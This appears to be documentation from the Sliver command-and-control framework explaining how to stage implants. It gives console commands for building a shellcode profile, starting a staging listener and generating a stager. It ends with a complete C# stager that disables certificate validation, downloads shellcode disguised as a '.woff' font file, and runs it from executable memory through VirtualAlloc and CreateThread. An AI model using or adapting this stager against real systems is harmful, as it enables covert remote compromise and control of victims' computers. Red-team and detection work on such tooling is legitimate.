__Important:__ You must have MinGW installed on your Sliver server to get some staged (e.g., Windows DLLs) payloads to work.

## Overview

As payloads can be pretty big (around 7MB), you may sometime require the use of stagers to execute your implant on a target system.

Sliver supports the `meterpreter` staging protocol over TCP and HTTP(S). This protocol is pretty straight forward:

- read the size of the stage 2 payload on the wire (the first 4 bytes for the TCP stager)
- download the stage 2
- allocate the size read in the first step, and write the stage in memory

For this to work, we need the following pieces:

- a staging server (the Sliver server)
- a stage 2 payload (usually a Sliver shellcode, but can be in other formats)
- stagers (generated by `msfvenom`, the Sliver `generate stager` command, or a custom one)

## Example

Sliver implements staging by reusing the profiles feature. Profiles are sorts of implant blueprints that define a configuration to be reused by the `profile generate` command.
The following command creates a new profile that we will use for our staging listener:

```
sliver > profile new --profile-name win-shellcode --mtls 192.168.122.1 --skip-symbols --format shellcode

[*] Saved new profile win-shellcode

sliver > profiles 

Name           Platform       Command & Control              Debug  Format      Obfuscation   Limitations
====           ========       =================              =====  ======      ===========   ===========
win-shellcode  windows/amd64  [1] mtls://192.168.122.1:8888  false  SHELLCODE   strings only  
```

We can now create a staging listener and link it to the profile:

```
sliver > stage-listener --url tcp://192.168.122.1:1234 --profile win-shellcode

[*] No builds found for profile win-shellcode, generating a new one
[*] Job 1 (tcp) started
sliver > jobs

ID  Name  Protocol  Port  
==  ====  ========  ====  
1   TCP   tcp       1234  
2   mtls  tcp       8888  
```

Sliver staging listeners only accept `tcp://` and `http://` schemes for the `--url` flag. The format for this flag is `scheme://IP:PORT`. If no value is specified for `PORT`, an error will be thrown out.

We can now generate a stager using the `generate stager` command:

```
sliver > generate stager --lhost 192.168.122.1 --lport 1234 --save /tmp

[*] Sliver stager saved to: /tmp/CIRCULAR_BRA
```

By default, the staging protocol used is TCP. The `--protocol` flag can be used to specify either `tcp` or `http` as the staging protocol.
The generated shellcode can now be used on the target system to start a new Sliver session.

## Custom stagers

One thing to consider while writing or using a custom stager, especially for the HTTP protocol, is that the Sliver server will only serve stage 2 payloads on specifically defined URLs. Indeed, since the HTTP staging listener is reusing the regular HTTP listener, it follows the same [procedural HTTP protocol](https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2#procedural-http-c2).
The extension used to retrieve a stage 2 payload is `.woff`.

As a result, if you want to implement your own stager to fetch a stage 2 payload via HTTP, you need to query a URL that looks like this: `http://SLIVER-SERVER:STAGING-PORT/whatever.woff`.

Here is a C# example of a custom HTTP stager:

```csharp
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace SliverStager
{
    public class Stager
    {
        private string url = "http://a.bc/fonts/FontAwesome.woff";

        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
        );
    }
}
```